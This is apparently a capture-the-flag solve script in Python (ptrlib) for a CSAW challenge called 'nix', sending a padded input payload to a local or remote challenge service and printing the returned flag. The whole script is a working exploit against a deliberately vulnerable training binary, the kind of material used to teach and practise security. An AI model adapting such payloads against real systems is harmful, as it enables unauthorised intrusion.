#!/usr/bin/env python
import sys
import ptrlib as ptr

exe = ptr.ELF("./chal")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return ptr.Socket("nix.ctf.csaw.io", 1000)
    else:
        return ptr.Process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def main():
    io = connect()

    payload = b"A"
    payload += b"A" * 0x18 + b"+"
    io.sendlineafter("Tell me what you know about *nix philosophies: ", payload)
    io.sendline("make every program a filter")

    io.recvuntil("csawctf")
    flag = "csawctf" + io.recvline().decode()
    ptr.logger.info(f"flag = {flag}")
    return


if __name__ == "__main__":
    main()
